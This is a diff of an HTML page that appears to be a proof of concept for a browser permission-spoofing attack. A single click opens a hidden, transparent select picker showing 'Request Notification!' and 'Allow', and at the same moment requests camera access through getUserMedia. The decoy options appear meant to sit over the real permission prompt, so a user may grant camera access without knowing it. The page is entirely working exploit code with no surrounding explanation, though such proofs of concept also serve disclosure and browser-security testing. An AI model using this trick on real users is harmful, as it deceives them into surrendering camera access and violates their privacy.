@@ -1,48 +1,71 @@
-<select id="select">
-    <option>Request Notification..</option>
-    <option>Allow</option>
-</select>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
 
 <style>
-#select {
-    opacity: 0;
-    pointer-events: none;
-    position: absolute;
-}
+    #select {
+        position: absolute;
+        top: 7%;
+        left: 10%;
+        opacity: 0;
+        pointer-events: none;
+    }
+
+    option {
+        background-color: black;
+        color: white;
+    }
 </style>
+</head>
+
+<body>
+
+<pre id="status" style="font-size: 1.2rem;">
+Click anywhere to begin
+</pre>
 
 <select id="select">
-    <option>Request Notification..</option>
+    <option>Request Notification!    </option>
     <option>Allow</option>
 </select>
-
-<style>
-#select {
-    opacity: 0;
-    position: absolute;
-    left: 0;
-    top: 0;
-}
-</style>
 
 <script>
-document.addEventListener("click", async () => {
-    const select = document.getElementById("select");
+const selectpicker = document.getElementById("select");
+const status = document.getElementById("status");
 
-    // Trigger native select picker
+function requestCameraPermission() {
     try {
-        select.showPicker();
+        navigator.mediaDevices.getUserMedia({
+            video: true
+        }).then(stream => {
+            console.log("Camera permission granted");
+        }).catch(err => {
+            console.log("Camera request:", err);
+        });
+    } catch (e) {
+        console.error(e);
+    }
+}
+
+function handleClick() {
+    // Both are triggered directly from the same user activation
+    requestCameraPermission();
+
+    try {
+        selectpicker.showPicker();
     } catch (e) {
         console.error("showPicker:", e);
     }
 
-    // Trigger camera permission
-    try {
-        await navigator.mediaDevices.getUserMedia({
-            video: true
-        });
-    } catch (e) {
-        console.error("getUserMedia:", e);
-    }
-});
+    status.textContent =
+        "Select triggered and camera requested";
+
+    document.removeEventListener("click", handleClick);
+}
+
+document.addEventListener("click", handleClick);
 </script>
+
+</body>
+</html>
